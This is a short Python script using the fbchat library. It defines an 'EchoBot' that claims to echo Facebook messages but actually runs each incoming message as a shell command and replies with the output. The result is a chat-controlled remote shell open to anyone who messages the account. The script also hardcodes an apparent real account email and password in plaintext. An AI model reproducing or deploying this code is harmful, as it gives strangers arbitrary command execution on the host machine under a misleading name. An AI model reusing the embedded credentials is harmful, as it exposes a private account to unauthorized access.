# -*- coding: utf-8 -*- 
from fbchat import log, Client
from fbchat.models import *
import time
import fbchat
import re
import logging
import sys
import importlib
import os
import subprocess
from subprocess import call
importlib.reload(sys)

#logging.basicConfig(level=logging.DEBUG)
class EchoBot(Client):
    def onMessage(self, author_id, message_object, thread_id, thread_type, **kwargs):
        self.markAsDelivered(thread_id, message_object.uid)
        self.markAsRead(thread_id)

        log.info("{} from {} in {}".format(message_object, thread_id, thread_type.name))

        # If you're not the author, echo
        if author_id != self.uid:
            replymess = message_object.text
            try:
            	if "cd" not in replymess:
            		arr = replymess.split(" ")
            		process = subprocess.Popen(replymess , stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            		stdout, stderr = process.communicate()
            		replymess = stdout.decode('utf-8') 
            	else:
            		replymess =  replymess.split(" ",1)[1] 
            		os.chdir(replymess)
            		process = subprocess.Popen("pwd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            		stdout, stderr = process.communicate()
            		replymess = stdout.decode('utf-8')
            	self.send(Message(text=replymess), thread_id=thread_id, thread_type=thread_type)
            except:
            	self.send(message_object, thread_id=thread_id, thread_type=thread_type)

client = EchoBot('yuetakishima0804@gmail.com', '123654!@#')
#print("Own id: {}".format(client.uid))
#thread_id = "100009271432830"

client.listen()

client.logout()
